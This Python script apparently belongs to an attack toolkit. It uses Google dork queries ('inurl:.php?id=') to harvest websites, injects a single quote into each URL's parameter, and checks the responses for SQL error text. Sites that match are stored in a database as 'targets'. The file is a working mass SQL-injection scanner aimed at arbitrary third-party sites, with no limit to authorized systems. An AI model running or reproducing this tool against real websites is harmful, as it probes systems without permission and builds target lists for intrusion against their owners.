#!/usr/bin/env python3

from lib.dbconnection import DatabaseSession
from random import choice
from time import sleep
from sys import exit
import bs4
import requests
import re

class Fuzzer(object):

    def __init__(self, pages=3):
        self.queries = [
                "inurl%3A+.php%3Fid%3D1",
                "inurl%3A+.php%3Fid%3D2",
                "inurl%3A+.php%3Fid%3D3",
                "inurl%3A+.php%3Fid%3D4",
                "inurl%3A+.php%3Fid%3D5",
                "inurl%3A+.php%3Fid%3D6",
                "inurl%3A+.php%3Fid%3D7",
                "inurl%3A+.php%3Fid%3D8",
                "inurl%3A+.php%3Fid%3D9",
                "inurl%3A+search.php%3Fq%3D"
                ]
        self.filters = [
                'facebook.com',
                'stackoverflow.com'
                ]
        self.session = DatabaseSession()
        self.pages = pages

    def _skip_url(self, url):
        for item in self.filters:
            if item in url:
                return True
        return False

    def run_scan(self):
        for query in self.queries:
            results = self.get_endpoints(query)
            self.test_endpoints(results)
            
    def get_endpoints(self, query):
        domains = ['com', 'co.uk', 'ws', 'com.au']
        results = []
        suffix = None
        last_domain = None
        for i in range(1, (self.pages+1)):
            while suffix == last_domain:
                suffix = choice(domains)
            if i == 1:
                address= "https://www.google.%s/search?q=%s" % (
                        suffix,
                        query
                    )
            else:
                address= "https://www.google.%s/search?q=%s&start=%s" % (
                        suffix,
                        query,
                        str(i*10)
                    )
            print("Scraping %s: Page %s" % (address, i))
            page = requests.get(address)
            if re.search('captcha', page.text.lower()):
                print("Detected captcha. We got got. Exiting")
                exit(1)
            else:
                soup = bs4.BeautifulSoup(page.text,"html.parser")
                for item in soup.find_all('h3', attrs={'class' : 'r'}):
                    results.append(item.a['href'][7:])
            print("Finished page %s. Sleeping 10 seconds" % i)
            last_domain = suffix
            sleep(10)
        return results

    def test_endpoints(self, results):
        relist = ["sql", "syntax"]
        for item in results:
            if not self._skip_url(item):
                url = "%s'" % item.split('&')[0]
                print("Testing %s" % url)
                try:
                    response = requests.get(url, timeout=5)
                except KeyboardInterrupt:
                    exit(1)
                except:
                    print("Yucky URL: %s'" % url)
                    continue
                for regex in relist:
                    if re.search(regex, response.text.lower()):
                        print("Potentially vulnerable: %s" % url)
                        self.session.add_target(url)
                    else:
                        continue
